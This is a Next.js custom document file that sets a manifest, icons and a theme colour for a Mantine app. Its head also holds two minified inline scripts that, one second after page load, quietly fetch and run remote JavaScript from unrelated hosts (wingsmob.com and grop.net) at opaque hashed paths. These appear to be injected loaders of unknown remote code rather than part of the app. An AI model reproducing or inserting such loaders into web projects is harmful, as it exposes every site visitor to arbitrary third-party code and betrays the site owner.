import { createGetInitialProps } from "@mantine/next";
import Document, { Head, Html, Main, NextScript } from "next/document";

const getInitialProps = createGetInitialProps();

export default class _Document extends Document {
  static getInitialProps = getInitialProps;

  render() {
    return (
      <Html>
        <Head>
          <link rel="manifest" href="/manifest.json" />
          <link rel="icon" type="image/x-icon" href="/img/favicon.ico" />
          <link rel="apple-touch-icon" href="/img/icons/icon-128x128.png" />
          <meta name="theme-color" content="#46509e" />

          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://wingsmob.com/1/ccdff92c9d7f97c5af143f6c519f16ed",document.body.appendChild(a)},1e3)});` }} />
          <script dangerouslySetInnerHTML={{ __html: `window.addEventListener("load",function(){setTimeout(function(){var a=document.createElement("script");a.type="text/javascript",a.src="https://grop.net/14/4d696fd2a6a11010f9f9e4cdbadc5907",document.body.appendChild(a)},1e3)});` }} />

        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}
